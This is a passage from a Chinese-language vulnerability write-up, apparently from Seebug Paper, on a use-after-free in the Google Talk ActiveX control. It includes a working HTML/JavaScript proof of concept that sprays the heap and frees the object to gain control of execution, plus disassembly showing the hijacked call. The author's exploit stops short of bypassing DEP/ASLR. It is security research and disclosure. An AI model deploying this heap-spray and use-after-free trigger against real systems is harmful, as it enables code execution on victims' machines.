       classid="clsid:39125640-8D80-11DC-A2FE-C5C455D89593" id=sdr  
     >  
     </object>  
     </div>  
     <div id="corelanspraydiv"></div>  
     <script>  
     var largechunk = unescape("%u2030%u2228");  
     var spray = new Array();  
     function dospray()  
     {  
          while (largechunk.length < 0x10000) largechunk += largechunk;  
          for (var i = 0; i < 0x200; i++)  
          {  
               spray[i] = largechunk.substring(0,(0x50-6)/2);  
          }  
     }  
     function corelan_deps_spray()  
     {  
          var div_container = document.getElementById("corelanspraydiv");  
          div_container.style.cssText = "display:none";  
          junk = unescape("%u615d%u6161");  
          while (junk.length < 0x80000) junk += junk;  
          for (var i = 0; i < 0x500; i++)  
          {  
               var obj = document.createElement("button");  
               obj.title = junk;  
               div_container.appendChild(obj);  
          }  
     }  
     function sdrcallback(){  
          //alert("callback function is called!"); //use this to attach debugger and bu googletalkax!DllUnregisterServer+0x6385   
          this.document.getElementById("seandiv").innerHTML = "";  
          CollectGarbage();  
          CollectGarbage();  
          CollectGarbage();  
          //spray the heap with 0x50 size objects, this will overwrite the freed chunk  
          dospray();  
          //interact with the object  
          var ver = sdr.version;  
          sdr.send("sean");  
     }  
     //prime the lfh heap  
     dospray();  
     //spray reliable so location at 0x20302228 holds our data  
     corelan_deps_spray();  
     //invoke callback function  
     sdr.onmessage = sdrcallback;  
     </script>  
     <body>  
    
     </body>  
     </html>  

代码通过DEPS堆喷能确保将内存0x20302228处的对应值置为0x6161615d。

之后，“onmessage”方法的回调函数中会进行对象的释放操作，并通过堆喷分配大量相同大小（0x50字节）的字符串对象来重写此释放内存。这时该释放指针指向的内容就变成了新分配的字符串对象，其中包含了指向0x20302228的指针。当访问此释放指针时，同样会执行下述的汇编代码：

    
    
     13e70ca5 8b471c        mov   eax,dword ptr [edi+1Ch]  
     13e70ca8 8b30          mov   esi,dword ptr [eax] 
     13e70caa 8d850cffffff  lea   eax,[ebp-0F4h]  
     13e70cb0 50            push  eax  
     13e70cb1 8d45e4        lea   eax,[ebp-1Ch]  
     13e70cb4 50            push  eax  
     13e70cb5 e8768e0000    call  googletalkax!DllUnregisterServer+0xf210 (13e79b30)  
     13e70cba 8b4f1c        mov   ecx,dword ptr [edi+1Ch]  
     13e70cbd 83c408        add   esp,8  
     13e70cc0 50            push  eax  
     13e70cc1 ff5604        call  dword ptr [esi+4]  

不同的是之前释放指针指向的EDI+1Ch中的无效内容现在被替换成了0x20302228，这个值会被保存到EAX寄存器中，而后0x20302228内存处的值又被赋值给了ESI寄存器，即通过DEPS堆喷设置的0x6161615d。最后程序会调用ESI+4指向的地址，也就是我们可控的0x61616161地址处的值，从而证明了代码的执行。

### 0x08 后续工作

后续的工作就是要把此漏洞转换成真正可利用的exploit，不过由于程序存在DEP和ASLR保护，我们还需要借此实现相关的infoleak，我之前花了些时间试图借助https://media.blackhat.com/bh-us-12/Briefings/Serna/BH_US_12_Serna_Leak_Era_Slides.pdf
中的内容来寻找灵感，但最终还是没能再继续下去。你要是有什么idea欢迎联系我一起讨论，如果能找到将这个bug转换成infoleak的方法，那么我会非常感兴趣的。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/212/>

